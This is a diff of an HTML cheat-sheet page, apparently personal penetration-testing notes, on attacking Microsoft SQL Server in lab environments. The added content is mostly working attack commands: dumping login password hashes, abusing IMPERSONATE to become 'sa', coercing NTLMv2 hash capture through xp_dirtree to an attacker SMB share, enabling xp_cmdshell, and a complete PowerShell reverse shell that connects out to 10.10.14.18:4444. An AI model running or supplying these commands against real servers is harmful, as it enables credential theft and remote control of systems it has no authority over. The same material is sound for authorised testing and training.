@@ -23,12 +23,64 @@
             <p>Database system developed by Microsoft</p>
         </div>
         <div class="notion-body">
+            <h2>Information</h2>
+            <ul>
+                <li>Useful users: dbo</li>
+                <li>Useful roles: sysadmin, securityadmin</li>
+                <li>Useful permissions: IMPERSONATE</li>
+            </ul>
+
             <h2>Usage</h2>
             <h3> Connect to DB </h3>
             <ul>
                 <p> You must have impacket suit installed (/examples directory)</p>
-                <pre><code class="language-bash">python3 mssqlclient.py user:password@IP_VICTIM</code></pre>
+                <pre><code class="language-bash">mssqlclient.py user:password@IP_VICTIM</code></pre>
+                <p>In case the user you are using is not present in MSSQL SRV users you can use a domain authentication using the the flag...</p>
+                <pre><code class="language-bash">mssqlclient.py user:password@IP_VICTIM -windows-auth</code></pre>
             </ul>
+
+            <h3>Useful commands</h3>
+            <ul>
+                <p>Get version</p>
+                <pre><code class="language-sql">SELECT @@version;</code></pre>
+
+                <p>Current user and check if admin</p>
+                <pre><code class="language-sql">SELECT SYSTEM_USER; SELECT USER_NAME(); SELECT IS_SRVROLEMEMBER('sysadmin');</code></pre>
+
+                <p>List databases</p>
+                <pre><code class="language-sql">SELECT name FROM master.dbo.sysdatabases;</code></pre>
+
+                <p>List tables from a current database</p>
+                <pre><code class="language-sql">SELECT table_name FROM information_schema.tables;</code></pre>
+                
+                <p>List server users</p>
+                <pre><code class="language-sql">SELECT name FROM master.sys.syslogins;</code></pre>
+
+                <p>Dump credentials</p>
+                <pre><code class="language-sql">SELECT name, password_hash FROM sys.sql_logins;</code></pre>
+
+                <p>Show linked servers</p>
+                <pre><code class="language-sql">EXEC sp_linkedservers;</code></pre>
+
+                <p>Execute commands in linked server (Check which user you are)</p>
+                <pre><code class="language-sql">EXEC ('SELECT SYSTEM_USER, USER_NAME()') AT [DC02.darkzero.ext];</code></pre>
+
+                <p>Check if users have impersonate permission</p>
+                <pre><code class="language-sql">SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';</code></pre>
+                <p>In case you can...</p>
+                <pre><code class="language-sql">EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;</code></pre>
+                
+
+                
+
+
+
+                SELECT name FROM master.sys.syslogins;
+            </ul>
+
+
+
+            
             <h2>Enumeration</h2>
             <ul>
                 <p>Files that may contain credentials</p>
@@ -37,15 +89,30 @@
 
             <h2> Exploitation </h2>
             <ul>
-                <h3> Configuration to execute commands from BBDD system</h3>
+            <h3>NTLMv2 capture and crack</h3>
+            <p>From the MSSQL SRV you can perform a SMB connection to a controlled share in orde to capture the hash NTLMv2 and then crack it locally</p>
+            <ul>
+                <p>Open a smb share</p>
+                <pre><code class="language-sql">impacket-smbserver share .</code></pre>    
+                <p>Open responder</p>
+                <pre><code class="language-sql">responder -I tun0</code></pre>
+                <p>Perform connection from MSSQL SRV </p>
+                <pre><code class="language-sql">EXEC xp_dirtree '\\10.10.14.17\share';</code></pre>
+                <p>Capture hash and crack it using hashcat</p>
+            </ul>     
+
+             <h3>OS Command execution</h3> 
+             <ul>  
+                <h4> Configuration to execute commands from BBDD system</h4>
 
                 <pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;</code></pre>
-                <h3> Reverse Socket connection </h3>
+                <h4> Reverse Socket connection </h4>
                 <pre><code class="language-sql">EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.18'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"';</code></pre>
+            </ul>        
             </ul>
             
             
